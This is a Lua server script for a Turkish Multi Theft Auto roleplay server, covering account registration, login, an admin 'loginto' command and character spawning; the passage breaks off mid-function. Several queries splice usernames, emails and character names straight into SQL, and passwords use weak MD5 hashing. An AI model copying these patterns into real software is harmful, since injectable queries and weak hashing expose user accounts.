local mysql = exports.os_mysql

function getElementDataEx(theElement, theParameter)
	return getElementData(theElement, theParameter)
end

function setElementDataEx(theElement, theParameter, theValue, syncToClient, noSyncAtall)
	setElementData(theElement, theParameter, theValue)
	return true
end


function resourceStart(resource)
	setWaveHeight ( 0 )
	setGameType("EN İYİ FPS")
	--setGameType("")
	setMapName("Vice City")
	setRuleValue("Sürüm", "v0.1")
	setRuleValue("Geliştiriciler", "wleathrus")

	
	for key, value in ipairs(exports.os_pool:getPoolElementsByType("player")) do
		triggerEvent("playerJoinResourceStart", value, resource)
	end

end
addEventHandler("onResourceStart", getResourceRootElement(getThisResource()), resourceStart)

function onJoin()
	local skipreset = false
	local loggedIn = getElementData(source, "loggedin")
	if loggedIn == 1 then

		skipreset = true
		setElementDataEx(source, "account:seamless:validated", true, false, true)
		
	end
	if not skipreset then 
		-- Set the user as not logged in, so they can't see chat or use commands
		setElementData(source, "loggedin", 0, false)
		setElementData(source, "account:loggedin", false, false)
		setElementData(source, "account:username", "", false)
		setElementData(source, "account:id", "", false)
		setElementData(source, "dbid", false)
		setElementData(source, "admin_level", 0, false)
		setElementData(source, "hiddenadmin", 0, false)
		setElementData(source, "globalooc", 1, false)
		setElementData(source, "muted", 0, false)
		setElementData(source, "loginattempts", 0, false)
		setElementData(source, "timeinserver", 0, false)
		setElementData(source, "chatbubbles", 0, false)
		setElementDimension(source, 9999)
		setElementInterior(source, 0)
	end
	
	exports.os_global:updateNametagColor(source)
end
addEventHandler("onPlayerJoin", getRootElement(), onJoin)
addEvent("playerJoinResourceStart", false)
addEventHandler("playerJoinResourceStart", getRootElement(), onJoin)

function resetNick(oldNick, newNick)
	setElementData(client, "legitnamechange", 1)
	setPlayerName(client, oldNick)
	setElementData(client, "legitnamechange", 0)
	exports.os_global:sendMessageToAdmins("Admin Warn: " .. tostring(oldNick) .. " kendi adını değiştirmek için çalıştı " .. tostring(newNick) .. ".")
end
addEvent("resetName", true )
addEventHandler("resetName", getRootElement(), resetNick)
function clientReady()
	local thePlayer = source
	local resources = getResources()
	local missingResources = false
	for key, value in ipairs(resources) do
		local resourceName = getResourceName(value)
		if resourceName == "global" or resourceName == "mysql" or resourceNmae == "pool" then
			if getResourceState(value) == "loaded" or getResourceState(value) == "stopping" or getResourceState(value) == "failed to load" then
				missingResources = true
				outputChatBox("Sunucu bağımlı kaynak eksik '"..getResourceName(value).."'.", thePlayer, 255, 0, 0)
				outputChatBox("Kısa bir süre sonra tekrar deneyiniz", thePlayer, 255, 0, 0)
				break
			end
		end
	end
	if missingResources then return end
	if not willPlayerBeBanned then
		triggerClientEvent(thePlayer, "beginLogin", thePlayer)
	else
		triggerClientEvent(thePlayer, "beginLogin", thePlayer, "Banned.")
	end
end
addEvent("onJoin", true)
addEventHandler("onJoin", getRootElement(), clientReady)

addEventHandler("accounts:login:request", getRootElement(), 
	function ()
		local seamless = getElementData(client, "account:seamless:validated")
		if seamless == true then
			setElementData(client, "account:seamless:validated", false, false, true)
			triggerClientEvent(client, "accounts:options", client)
			triggerClientEvent(client, "item:updateclient", client)
			return
		end
		triggerClientEvent(client, "accounts:login:request", client)
	end
);

function playerRegister(username,password,confirmPassword, email)
	local mtaSerial = getPlayerSerial(client)
	local encryptionRule = tostring(math.random(0,9))..tostring(math.random(0,9))..tostring(math.random(0,9))..tostring(math.random(0,9))..tostring(math.random(0,9))..tostring(math.random(0,9))..tostring(math.random(0,9))..tostring(math.random(0,9))..tostring(math.random(0,9))..tostring(math.random(0,9))
	local encryptedPW = string.lower(md5(string.lower(md5(password))..encryptionRule))
	local ipAddress = getPlayerIP(client)
	
	dbQuery(playerRegisterCallback, {client, username, password, mtaSerial, ipAddress, encryptedPW, encryptionRule, email}, mysql:getConnection(), "SELECT username,mtaserial FROM accounts WHERE (username = ? or mtaserial = ?)", username, mtaSerial)
end
addEvent("accounts:register:attempt",true)
addEventHandler("accounts:register:attempt",getRootElement(),playerRegister)


function playerRegisterCallback(queryHandler, client, username, password, serial, ip, encryptedPW, encryptionRule, email)
	local result, rows, err = dbPoll(queryHandler, 0)
	if rows > 0 then
		triggerClientEvent(client,"set_warning_text",client,"Register","Kullanıcı adı/email kullanılıyor veya yeni bir hesap oluşturmaya çalışıyorsun! ("..result[1]["username"]..")")
	else
		dbExec(mysql:getConnection(), "INSERT INTO `accounts` SET `username`='"..username.."', `password`='"..encryptedPW.."', `email`='"..email.."', `registerdate`=NOW(), `ip`='"..ip.."', `salt`='"..encryptionRule.."', `mtaserial`='"..serial.."', `activated`='1' ")
		triggerClientEvent(client,"accounts:register:complete",client, username, password)
	end
end

local accountCharacters = {}
local onlineForPlayer = {}

function validateCredentials(username,password,checksave)
	if not (username == "") then
		if not (password == "") then	
			return true
		else
			triggerClientEvent(client,"set_warning_text",client,"Login","Please enter your password!")
		end
	else
		triggerClientEvent(client,"set_warning_text",client,"Login","Please enter your username!")
	end
	return false
end
addEvent("onRequestLogin",true)
addEventHandler("onRequestLogin",getRootElement(),validateCredentials)

function playerLogin(username,password,checksave)
	if not validateCredentials(username,password,checksave) then
		return false
	end

	dbQuery(loginCallback, {client,username,password}, mysql:getConnection(), "SELECT * FROM `accounts` WHERE `username`='".. username .."'")
end
addEvent("accounts:login:attempt",true)
addEventHandler("accounts:login:attempt",getRootElement(),playerLogin)

function loginCallback(queryHandler,source,username,password)
	local result, rows, err = dbPoll(queryHandler, 0)
	if rows > 0 then
		row = result[1]

		local encryptionRule = row["salt"]
		local encryptedPW = string.lower(md5(string.lower(md5(password))..encryptionRule))
		if row["password"] ~= encryptedPW then
			triggerClientEvent(source,"set_warning_text",source,"Login",username.." kullanıcı adı için şifreler eşleşmiyor!")
			return
		end

		if (onlineForPlayer[row["id"]]) then
			thePlayer = onlineForPlayer[tonumber(row["id"])]
			if (thePlayer ~= source) then
				kickPlayer(thePlayer, thePlayer, "Bir kullanıcı hesabınıza giriş yaptı!")
				--triggerClientEvent(source,"set_authen_text",source,"Login","Hesabınızda başka bir kullanıcı bulunuyor, diğer kullanıcı sunucudan uzaklaştırıldı!")
			end
		end
		onlineForPlayer[tonumber(row["id"])] = source
		dbExec(mysql:getConnection(), "UPDATE accounts SET online='1' WHERE id = ?", tonumber(row["id"]))
		
		
		-- odinscripting triggerClientEvent(source, "items:inventory:hideinv", source)
		
		setElementDataEx(source, "account:loggedin", true, true)
		setElementDataEx(source, "account:id", tonumber(row["id"]), true)
		setElementDataEx(source, "voiceEnabled", "1", true)
		
		setElementDataEx(source, "account:username", row["username"], true)
		setElementDataEx(source, "account:charLimit", tonumber(row["characterlimit"]), true)
		setElementDataEx(source, "electionsvoted", row["electionsvoted"], true)
		setElementDataEx(source, "account:email", row["email"])
		setElementDataEx(source, "account:creationdate", row["registerdate"])
		setElementDataEx(source, "account:email", row["email"])
		setElementDataEx(source, "credits", tonumber(row["credits"]))
		
		--triggerEvent("updateCharacters",source, source)
		setElementDataEx(source, "admin_level", tonumber(row['admin']), true)
		setElementDataEx(source, "supporter_level", tonumber(row['supporter']), true)
		setElementDataEx(source, "vct_level", tonumber(row['vct']), true)
		setElementDataEx(source, "mapper_level", tonumber(row['mapper']), true)
		setElementDataEx(source, "scripter_level", tonumber(row['scripter']), true)

		
		setElementDataEx(source, "charlimit", tonumber(row['charlimit']), true)
		setElementDataEx(source, "bakiyeMiktar", tonumber(row['bakiyeMiktari']), true)
		setElementDataEx(source, "tamirKit", tonumber(row['tamirKit']), true)
		setElementDataEx(source, "rdstats", tonumber(row['rdstats']), true)
		
		--exports["os_animations"]:getCustomAnimations(source)
		setElementDataEx(source, "custom_animations", tonumber(row['custom_animations']), true)
	
		exports['os_reports']:reportLazyFix(source)
		setElementDataEx(source, "adminreports", tonumber(row["adminreports"]), true)
		setElementDataEx(source, "adminreports_saved", tonumber(row["adminreports_saved"]))
		if tonumber(row['referrer']) and tonumber(row['referrer']) > 0 then
			setElementDataEx(source, "referrer", tonumber(row['referrer']), false, true)
		end
		
		if exports.os_integration:isPlayerLeadAdmin(source) then
			setElementDataEx(source, "hiddenadmin", row["hiddenadmin"], true)
		else
			setElementDataEx(source, "hiddenadmin", 0, true)
		end

		local vehicleConsultationTeam = exports.os_integration:isPlayerVehicleConsultant(source)
		setElementDataEx(source, "vehicleConsultationTeam", vehicleConsultationTeam, false)

		if tonumber(row["adminjail"]) == 1 then
			setElementDataEx(source, "adminjailed", true, true)
		else
			setElementDataEx(source, "adminjailed", false, true)
		end
		setElementDataEx(source, "jailtime", tonumber(row["adminjail_time"]), true)
		setElementDataEx(source, "jailadmin", row["adminjail_by"], true)
		setElementDataEx(source, "jailreason", row["adminjail_reason"], true)

		if row["monitored"] ~= "" then
			setElementDataEx(source, "admin:monitor", row["monitored"], true)
		end

		dbExec(mysql:getConnection(), "UPDATE `accounts` SET `ip`='" .. getPlayerIP(source) .. "', `mtaserial`='" .. getPlayerSerial(source) .. "' WHERE `id`='".. tostring(row["id"]) .."'")

		setElementData(source, "forum_name", row["forum_name"])

		-- Militan
		for i=1, 6 do
			setElementData(source, "job_level:"..i, row["jlevel_"..i])
		end

		loadAccountSettings(source, row["id"])

	
		triggerClientEvent (source,"hideLoginWindow",source)
		triggerClientEvent(source, "vehicle_rims", source)
		local characters = {}
		dbQuery(
			function(qh, source)
				local res, rows, err = dbPoll(qh, 0)
				if rows > 0 then
					for index, value in ipairs(res) do
						if value.cked == 0 then
							local i = #characters + 1
							if not characters[i] then
								characters[i] = {}
							end
							characters[i][1] = value.id
							characters[i][2] = value.charactername
							characters[i][3] = tonumber(value.cked)
							characters[i][4] = ""
							characters[i][5] = value.age
							characters[i][6] = value.gender
							characters[i][9] = value.skin
							characters[i][11] = value.height
							characters[i][12] = value.weight
							characters[i][20] = value.x, value.y, value.z

						end
					end
				end
				setElementData(source, "account:characters", characters)
				triggerClientEvent(source, "accounts:login:attempt", source, 0 )
				triggerEvent( "social:account", source, tonumber( row["id"] ) )
			end,
		{source}, mysql:getConnection(), "SELECT * FROM characters WHERE account = ?", tonumber(row["id"]))
				
			
	else
		triggerClientEvent(source,"set_warning_text",source,"Login","Kullanıcı adı veritabanında bulunamadı! ('".. username .."')")
	end
end


addEventHandler("onPlayerQuit", root,
	function()
		onlineForPlayer[getElementData(source, "account:id")] = false
		dbExec(mysql:getConnection(), "UPDATE accounts SET online='0' WHERE id = ?", tonumber(getElementData(source, "account:id")))
	end
)

function myCallback( responseData, errno, id )
    if errno == 0 then
        exports.os_cache:addImage(id, responseData)
	end
end

addEventHandler("onResourceStart", resourceRoot,
	function()
		imported_accounts = {}
		imported_characters = {}
		dbQuery(
			function(qh)
				local res, rows, err = dbPoll(qh, 0)
				if rows > 0 then
					for index, value in ipairs(res) do
						row_info = {}
						for count, data in pairs(value) do
							row_info[count] = data
						end
						imported_accounts[#imported_accounts + 1] = row_info
					end
				end
			end,
		mysql:getConnection(), "SELECT * FROM `accounts`")
		dbQuery(
			function(qh)
				local res, rows, err = dbPoll(qh, 0)
				if rows > 0 then
					for index, value in ipairs(res) do
						row_info = {}
						for count, data in pairs(value) do
							row_info[count] = data
						end
						imported_characters[#imported_characters + 1] = row_info
					end
				end
			end,
		mysql:getConnection(), "SELECT * FROM `characters`")
	end
)

function updateTables()
	imported_accounts, imported_characters = {}, {}
	dbQuery(
		function(qh)
			local res, rows, err = dbPoll(qh, 0)
			if rows > 0 then
				for index, value in ipairs(res) do
					row_info = {}
					for count, data in pairs(value) do
						row_info[count] = data
					end
					imported_accounts[#imported_accounts + 1] = row_info
				end
			end
		end,
	mysql:getConnection(), "SELECT * FROM `accounts`")
	dbQuery(
		function(qh)
			local res, rows, err = dbPoll(qh, 0)
			if rows > 0 then
				for index, value in ipairs(res) do
					row_info = {}
					for count, data in pairs(value) do
						row_info[count] = data
					end
					imported_characters[#imported_characters + 1] = row_info
				end
			end
		end,
	mysql:getConnection(), "SELECT * FROM `characters`")
end

function getTableInformations()
	return imported_accounts, imported_characters
end

function characterList(theClient)
	local dbid = getElementData(theClient, "account:id")
	local accounts, character = getTableInformations() -- // odinscripting

	local characters = {}
	for index, value in ipairs(character) do
		if value.account == dbid and value.cked == 0 then
			local i = #characters + 1
			if not characters[i] then
				characters[i] = {}
			end
			characters[i][1] = value.id
			characters[i][2] = value.charactername
			characters[i][3] = tonumber(value.cked)
			characters[i][4] = ""
			characters[i][5] = value.age
			characters[i][6] = value.gender
			characters[i][9] = value.skin
			characters[i][11] = value.height
			characters[i][12] = value.weight
		end
	end
	return characters
end


function reloadCharacters()
	local chars = characterList(source)
	--setElementData(source, "account:characters", chars, true)
	setElementData(source, "account:characters", chars)
end
addEvent("updateCharacters", true)
addEventHandler("updateCharacters", getRootElement(), reloadCharacters)


function reconnectMe()
    redirectPlayer(client, "", 0 )
end
addEvent("accounts:reconnectMe", true)
addEventHandler("accounts:reconnectMe", getRootElement(), reconnectMe)
 

function adminLoginToPlayerCharacter(thePlayer, commandName, ...)
    if exports.os_integration:isPlayerSeniorAdmin(thePlayer) then
        if not (...) then
            outputChatBox("KULLANIM: /" .. commandName .. " [Tam karakter adı]", thePlayer, 255, 194, 14, false)
            outputChatBox("Oyuncunun karakterine ait loglar görüntüleniyor.", thePlayer, 255, 194, 0, false)
        else
            targetChar = table.concat({...}, "_")
            dbQuery(loginCharacterAdminCallback, {thePlayer, targetChar}, mysql:getConnection(), "SELECT `characters`.`id` AS `targetCharID` , `characters`.`account` AS `targetUserID` , `accounts`.`admin` AS `targetAdminLevel`, `accounts`.`username` AS `targetUsername` FROM `characters` LEFT JOIN `accounts` ON `characters`.`account`=`accounts`.`id` WHERE `charactername`='"..targetChar.."' LIMIT 1")
        end
    end
end
addCommandHandler("loginto", adminLoginToPlayerCharacter, false, false)
 
function loginCharacterAdminCallback(qh, thePlayer, name)
	local res, rows, err = dbPoll(qh, 0)
	if rows > 0 then
		local fetchData = res[1]
		local targetCharID = tonumber(fetchData["targetCharID"]) or false
        local targetUserID = tonumber(fetchData["targetUserID"]) or false
        local targetAdminLevel = tonumber(fetchData["targetAdminLevel"]) or 0
        local targetUsername = fetchData["targetUsername"] or false
        local theAdminPower = exports.os_global:getPlayerAdminLevel(thePlayer)
        if targetCharID and  targetUserID then
            local adminTitle = exports.os_global:getPlayerFullIdentity(thePlayer)
            if targetAdminLevel > theAdminPower then
                local adminUsername = getElementData(thePlayer, "account:username")
                outputChatBox("Sizden daha yüksek yetkiye sahip kişinin karakterine giriş yapamazsın.", thePlayer, 255,0,0)
                exports.os_global:sendMessageToAdmins("[GİRİŞ]: " .. tostring(adminTitle) .. " yüksek yetkiye sahip bir yöneticinin karakterine girmeye çalıştı ("..targetUsername..").")
                return false
            end
           
            spawnCharacter(targetCharID, targetUserID, thePlayer, targetUsername)  
            exports.os_global:sendMessageToAdmins("[GİRİŞ]: " .. tostring(adminTitle) .. " hesabına giriş yaptı, '"..targetUsername.."'.")
        end
	else
		outputChatBox("Karakter adı bulunamadı.", thePlayer, 255,0,0)
	end
end

addEvent("account:charactersQuotaCheck", true)
addEventHandler("account:charactersQuotaCheck", root,
    function(player)
        triggerClientEvent(player, "account:charactersQuotaCheck", player, true, "Onaylandı")
    end
)

function spawnCharacter(characterID, remoteAccountID, theAdmin, targetAccountName, location)
	if theAdmin then
		client = theAdmin
	end
	
	if not client then
		return false
	end
	
	if not characterID then
		return false
	end
	
	if not tonumber(characterID) then
		return false
	end
	characterID = tonumber(characterID)
	
	triggerEvent('setDrunkness', client, 0)
	setElementDataEx(client, "alcohollevel", 0, true)

	removeMasksAndBadges(client)
	
	setElementDataEx(client, "pd.jailserved")
	setElementDataEx(client, "pd.jailtime")
	setElementDataEx(client, "pd.jailtimer")
	setElementDataEx(client, "pd.jailstation")
	setElementDataEx(client, "loggedin", 0, true)
	
	local timer = getElementData(client, "pd.jailtimer")
	if isTimer(timer) then
		killTimer(timer)
	end
	
	if (getPedOccupiedVehicle(client)) then
		removePedFromVehicle(client)
	end
	-- End cleaning up
	
	local accountID = tonumber(getElementDataEx(client, "account:id"))
	
	local characterData = false
	
	if theAdmin then
		accountID = remoteAccountID
		sqlQuery = "SELECT * FROM `characters` LEFT JOIN `jobs` ON `characters`.`id` = `jobs`.`jobCharID` AND `characters`.`job` = `jobs`.`jobID` WHERE `id`='" .. tostring(characterID) .. "' AND `account`='" .. tostring(accountID) .. "'"
	else
		sqlQuery = "SELECT * FROM `characters` LEFT JOIN `jobs` ON `characters`.`id` = `jobs`.`jobCharID` AND `characters`.`job` = `jobs`.`jobID` WHERE `id`='" .. tostring(characterID) .. "' AND `account`='" .. tostring(accountID) .. "' AND `cked`=0"
	end
	
	dbQuery(
		function(qh, client, characterID, remoteAccountID, theAdmin, targetAccountName, location)
			local res, rows, err = dbPoll(qh, 0)
			if rows > 0 then
				characterData = res[1]
				if characterData then
					if characterData["description"] then
						setElementDataEx(client, "look", fromJSON(characterData["description"]) or {"", "", "", "", characterData["description"], ""})
					end
					setElementDataEx(client, "weight", characterData["weight"])
					setElementDataEx(client, "height", characterData["height"])
					setElementDataEx(client, "race", tonumber(characterData["skincolor"]))
					setElementDataEx(client, "maxvehicles", tonumber(characterData["maxvehicles"]))
					setElementDataEx(client, "maxinteriors", tonumber(characterData["maxinteriors"]))
					--DATE OF BIRTH
					setElementDataEx(client, "age", tonumber(characterData["age"]))
					setElementDataEx(client, "month", tonumber(characterData["month"]))
					setElementDataEx(client, "day", tonumber(characterData["day"]))
                        local countryUlkeDatasi = tonumber(characterData["ulke"])
		                    if tonumber(countryUlkeDatasi) > 0 then
								setElementData(client, "ulke", countryUlkeDatasi)
		                    else
		                       	triggerClientEvent(client, "ulkePaneliniAc", client)		
		                    end		
					
					-- LANGUAGES
					local lang1 = tonumber(characterData["lang1"])
					local lang1skill = tonumber(characterData["lang1skill"])
					local lang2 = tonumber(characterData["lang2"])
					local lang2skill = tonumber(characterData["lang2skill"])
					local lang3 = tonumber(characterData["lang3"])
					local lang3skill = tonumber(characterData["lang3skill"])
					local currentLanguage = tonumber(characterData["currlang"]) or 1
					setElementDataEx(client, "languages.current", currentLanguage, false)
									
					if lang1 == 0 then
							lang1skill = 0
					end
					
					if lang2 == 0 then
							lang2skill = 0
					end
					
					if lang3 == 0 then
							lang3skill = 0
					end
					
					setElementDataEx(client, "languages.lang1", lang1, false)
					setElementDataEx(client, "languages.lang1skill", lang1skill, false)
					
					setElementDataEx(client, "languages.lang2", lang2, false)
					setElementDataEx(client, "languages.lang2skill", lang2skill, false)
					
					setElementDataEx(client, "languages.lang3", lang3, false)
					setElementDataEx(client, "languages.lang3skill", lang3skill, false)
					-- END OF LANGUAGES
					
					setElementDataEx(client, "timeinserver", tonumber(characterData["timeinserver"]), false)
					
					setElementDataEx(client, "account:character:id", characterID, false)
					setElementDataEx(client, "dbid", characterID, true) -- workaround
					exports['os_items']:loadItems( client, true )
					
					
					setElementDataEx(client, "loggedin", 1, true)
					
					-- Check his name isn't in use by a squatter
					local playerWithNick = getPlayerFromName(tostring(characterData["charactername"]))
					if isElement(playerWithNick) and (playerWithNick~=client) then
						if theAdmin then
							local adminTitle = exports.os_global:getPlayerAdminTitle(theAdmin)
							local adminUsername = getElementData(theAdmin, "account:username")
							kickPlayer(playerWithNick, getRootElement(), adminTitle.." "..adminUsername.." has logged into your account.")
							outputChatBox(""..targetAccountName.." ("..tostring(characterData["charactername"]):gsub("_"," ")..") adlı hesap oyundan atıldı.", theAdmin, 0, 255, 0 )
						else
							kickPlayer(playerWithNick, getRootElement(), "Başkası senin karakterinde oturum açmış olabilir.")
						end
					end
					
					setElementDataEx(client, "bleeding", 0, false)
					
					-- Set their name to the characters
					setElementDataEx(client, "legitnamechange", 1)
					setPlayerName(client, tostring(characterData["charactername"]))
					local pid = getElementData(client, "playerid")
					local fixedName = string.gsub(tostring(characterData["charactername"]), "_", " ")

					setElementDataEx(client, "legitnamechange", 0)
					
					setPlayerNametagShowing(client, false)
					setElementFrozen(client, true)
					setPedGravity(client, 0)
					
					local locationToSpawn = {}
					if location then
						locationToSpawn.x = location[1]
						locationToSpawn.y = location[2]
						locationToSpawn.z = location[3]
						locationToSpawn.rot = location[4]
						locationToSpawn.int = location[5]
						locationToSpawn.dim = location[6]
					else
						locationToSpawn.x = tonumber(characterData["x"])
						locationToSpawn.y = tonumber(characterData["y"])
						locationToSpawn.z = tonumber(characterData["z"])
						locationToSpawn.rot = tonumber(characterData["rotation"])
						locationToSpawn.int = tonumber(characterData["interior_id"])
						locationToSpawn.dim = tonumber(characterData["dimension_id"])
					end
					spawnPlayer(client, locationToSpawn.x ,locationToSpawn.y ,locationToSpawn.z , locationToSpawn.rot, tonumber(characterData["skin"]))
					setElementDimension(client, locationToSpawn.dim)
					setElementInterior(client, locationToSpawn.int , locationToSpawn.x, locationToSpawn.y, locationToSpawn.z)
					setCameraInterior(client, locationToSpawn.int)
					

					exports["os_items"]:loadItems(client)

					setCameraTarget(client, client)
					setElementHealth(client, tonumber(characterData["health"]))
					setPedArmor(client, tonumber(characterData["armor"]))
					
					local teamElement = nil
					if (tonumber(characterData["faction_id"])~=-1) then
						teamElement = exports.os_pool:getElement('team', tonumber(characterData["faction_id"]))
						if not (teamElement) then       -- Facshun does not exist?
							characterData["faction_id"] = -1
							dbExec(mysql:getConnection(), "UPDATE characters SET faction_id='-1', faction_rank='1' WHERE id='" .. tostring(characterID) .. "' LIMIT 1")
						end
					end
					
					if teamElement then
						setPlayerTeam(client, teamElement)
					else
						setPlayerTeam(client, getTeamFromName("Citizen"))
					end

					
					local adminLevel = getElementDataEx(client, "admin_level")
					local gmLevel = getElementDataEx(client, "account:gmlevel")
					exports.os_global:updateNametagColor(client)
					-- ADMIN JAIL
					local jailed = getElementData(client, "adminjailed")
					local jailed_time = getElementData(client, "jailtime")
					local jailed_by = getElementData(client, "jailadmin")
					local jailed_reason = getElementData(client, "jailreason")

					if location then
							setElementPosition(client, location[1], location[2], location[3])
							setElementPosition(client, location[4], 0, 0)
					end
					
					if jailed then
						local incVal = getElementData(client, "playerid")
								
						setElementDimension(client, 55000+incVal)
						setElementInterior(client, 6)
						setCameraInterior(client, 6)
						setElementPosition(client, 263.821807, 77.848365, 1001.0390625)
						setPedRotation(client, 267.438446)
												
						setElementDataEx(client, "jailserved", 0, false)
						setElementDataEx(client, "adminjailed", true)
						setElementDataEx(client, "jailreason", jailed_reason, false)
						setElementDataEx(client, "jailadmin", jailed_by, false)
						
						if jailed_time ~= 999 then
							if not getElementData(client, "jailtimer") then
								setElementDataEx(client, "jailtime", jailed_time+1, false)
								--exports['os_admins']:timerUnjailPlayer(client)
								triggerEvent("admin:timerUnjailPlayer", client, client)
							end
						else
							setElementDataEx(client, "jailtime", "Unlimited", false)
							setElementDataEx(client, "jailtimer", true, false)
						end

						
						setElementInterior(client, 6)
						setCameraInterior(client, 6)
					elseif tonumber(characterData["pdjail"]) == 1 then -- PD JAIL Chaos New System
						setElementDataEx(client, "jailed", 1)
						exports["os_prison"]:checkForRelease(client)
					end
					
					setElementDataEx(client, "faction", tonumber(characterData["faction_id"]), true)
					setElementDataEx(client, "factionMenu", 0)
					local factionPerks = type(characterData["faction_perks"]) == "string" and fromJSON(characterData["faction_perks"]) or { }
					setElementDataEx(client, "factionPackages", factionPerks, true)
					setElementDataEx(client, "factionrank", tonumber(characterData["faction_rank"]), true)
					setElementDataEx(client, "factionphone", tonumber(characterData["faction_phone"]), true)
					setElementDataEx(client, "factionleader", tonumber(characterData["faction_leader"]), true)
					local factionPerks = type(characterData["faction_perms"]) == "string" and fromJSON(characterData["faction_perms"]) or {}
					setElementDataEx(client, "factionperms", factionPerms, true)
					
					setElementDataEx(client, "businessprofit", 0, false)
					setElementDataEx(client, "legitnamechange", 0)
					setElementDataEx(client, "muted", tonumber(muted))
					setElementDataEx(client, "minutesPlayed",  tonumber(characterData["minutesPlayed"]), true)
					setElementDataEx(client, "hoursplayed",  tonumber(characterData["hoursplayed"]), true)
					setElementDataEx(client, "mission",  tonumber(characterData["mission"]), true)
					setElementDataEx(client, "casinochip",  tonumber(characterData["casinochip"]), true)
					setPlayerAnnounceValue ( client, "score", characterData["hoursplayed"] )
					setElementDataEx(client, "alcohollevel", tonumber(characterData["alcohollevel"]) or 0, true)
					exports.os_global:setMoney(client, tonumber(characterData["money"]), true)
					exports.os_global:checkMoneyHacks(client)
					setElementDataEx(client, "PMDurumuVIP", tonumber(characterData["PMDurumuVIP"]), true)
					setElementData(client, "vipver", 0)
					local resource = getResourceFromName("os_vip")
					if resource then
					local state = getResourceState(resource)
                        if state == "running" then
                                setElementData(client, "vipver", 0)
                                exports['os_vip']:loadVIP(characterID)
                        end
					end					
					setElementDataEx(client, "restrain", tonumber(characterData["cuffed"]), true)
					setElementDataEx(client, "tazed", false, false)
					setElementDataEx(client, "realinvehicle", 0, false)
					
					setElementData(client, "hunger", tonumber(characterData["hunger"]) or 100, true)
					setElementData(client, "thirst", tonumber(characterData["thirst"]) or 100, true)

					setElementData(client, "sleep", tonumber(characterData["sleep"]) or 100, true)
					setElementData(client, "poop", tonumber(characterData["poop"]) or 100, true)
					setElementData(client, "pee", tonumber(characterData["pee"]) or 100, true)
					
					setElementData(client, "roldersi", tonumber(characterData["roldersi"]), true)
					setElementData(client, "avatar", tonumber(characterData["avatar"]), true)
					setElementData(client, "etiket", tonumber(characterData["etiket"]), true)
					setElementData(client, "donater", tonumber(characterData["donater"]), true)
					setElementData(client, "youtuber", tonumber(characterData["youtuber"]), true)
					setElementData(client, "soygun", tonumber(characterData["soygun"]), true)
					setElementData(client, "hud", tonumber(characterData["hud"]), true)
                    setElementDataEx(client, "ulke", tonumber(characterData["ulke"]),true)
									
					local duty = tonumber(characterData["duty"]) or 0
					setElementDataEx(client, "duty", duty, true)
					
					-- Job system - odinscripting
				--	setElementDataEx(client, "job", tonumber(characterData["jobID"]) or 0, true)
					setElementDataEx(client, "job", tonumber(characterData["job"]) or 0, true)
					setElementDataEx(client, "jobLevel", tonumber(characterData["jobLevel"]) or 0, true)
					setElementDataEx(client, "jobProgress", tonumber(characterData["jobProgress"]) or 0, true)
					
					-- odinscripting JOB SYSTEM
					if tonumber(characterData["job"]) == 1 then
						if characterData["jobTruckingRuns"] then
							setElementDataEx(client, "os_jobs:truckruns", tonumber(characterData["jobTruckingRuns"]), true)
							dbExec(mysql:getConnection(), "UPDATE `jobs` SET `jobTruckingRuns`='0' WHERE `jobCharID`='"..tostring(characterID).."' AND `jobID`='1' " )
						end
						triggerClientEvent(client,"restoreTruckerJob",client)
					end
					triggerEvent("restoreJob", client)
					--triggerClientEvent(client, "updateCollectionValue", client, tonumber(characterData["photos"]))
					--------------------------------------------------------------------------
					setElementDataEx(client, "license.car", tonumber(characterData["car_license"]), true)
					setElementDataEx(client, "license.bike", tonumber(characterData["bike_license"]), true)
					setElementDataEx(client, "license.boat", tonumber(characterData["boat_license"]), true)
					setElementDataEx(client, "license.pilot", tonumber(characterData["pilot_license"]), true)
					setElementDataEx(client, "license.fish", tonumber(characterData["fish_license"]), true)
					setElementDataEx(client, "license.gun", tonumber(characterData["gun_license"]), true)
					setElementDataEx(client, "license.gun2", tonumber(characterData["gun2_license"]), true)
					
					setElementDataEx(client, "bankmoney", tonumber(characterData["bankmoney"]), true)
					setElementDataEx(client, "fingerprint", tostring(characterData["fingerprint"]), false)
					setElementDataEx(client, "tag", tonumber(characterData["tag"]))
					setElementDataEx(client, "blindfold", tonumber(characterData["blindfold"]), false)
					setElementDataEx(client, "gender", tonumber(characterData["gender"]))
					setElementDataEx(client, "deaglemode", 1, true) -- Default to lethal
					setElementDataEx(client, "shotgunmode", 1, true) -- Default to lethal
					setElementDataEx(client, "firemode", 0, true) -- Default to auto
					setElementDataEx(client, "hunger", tonumber(characterData["hunger"]), true)
					setElementDataEx(client, "poop", tonumber(characterData["poop"]), true)
					setElementDataEx(client, "thirst", tonumber(characterData["thirst"]), true)
					setElementDataEx(client, "pee", tonumber(characterData["pee"]), true)
					setElementDataEx(client, "level", tonumber(characterData["level"]), true)
					--setElementDataEx(client, "stamina",  tonumber(characterData["stamina"]), true)
					setElementDataEx(client, "hoursaim", tonumber(characterData["hoursaim"]), true)
					setElementDataEx(client, "clothing:id", tonumber(characterData["clothingid"]) or nil, true)
					
					if (tonumber(characterData["restrainedobj"])>0) then
						setElementDataEx(client, "restrainedObj", tonumber(characterData["restrainedobj"]), false)
					end
					
					if ( tonumber(characterData["restrainedby"])>0) then
						setElementDataEx(client, "restrainedBy",  tonumber(characterData["restrainedby"]), false)
					end

					takeAllWeapons(client)
					
					if (getElementType(client) == 'player') then
						triggerEvent("updateLocalGuns", client)
					end
					
					dbQuery(
						function(qh)
							local res, rows, err = dbPoll(qh, 0)
							if rows > 0 then
								for index, row in ipairs(res) do
									local theVehicle = exports.os_pool:getElement("vehicle", tonumber(row.id))
									if not theVehicle then
										exports.os_vehicle:reloadVehicle(row.id)
									--	dbExec(mysql:getConnection(), "UPDATE `vehicles` SET `loadstate`='1' WHERE `id`='"..row.id.."'")
									end
								end
							end
						end,
					mysql:getConnection(), "SELECT id FROM `vehicles` WHERE deleted=0 AND owner='"..(characterData["id"]).."'")
									
					setPedStat(client, 70, 999)
					setPedStat(client, 71, 999)
					setPedStat(client, 72, 999)
					setPedStat(client, 74, 999)
					setPedStat(client, 76, 999)
					setPedStat(client, 77, 999)
					setPedStat(client, 78, 999)
					setPedStat(client, 77, 999)
					setPedStat(client, 78, 999)
					setPedStat(client, 79, 999) -- Strafeing fix
					
					toggleAllControls(client, true, true, true)
					triggerClientEvent(client, "onClientPlayerWeaponCheck", client)
					setElementFrozen(client, false)
					
					
					-- Player is cuffed
					if (tonumber(characterData["cuffed"])==1) then
						toggleControl(client, "sprint", false)
						toggleControl(client, "fire", false)
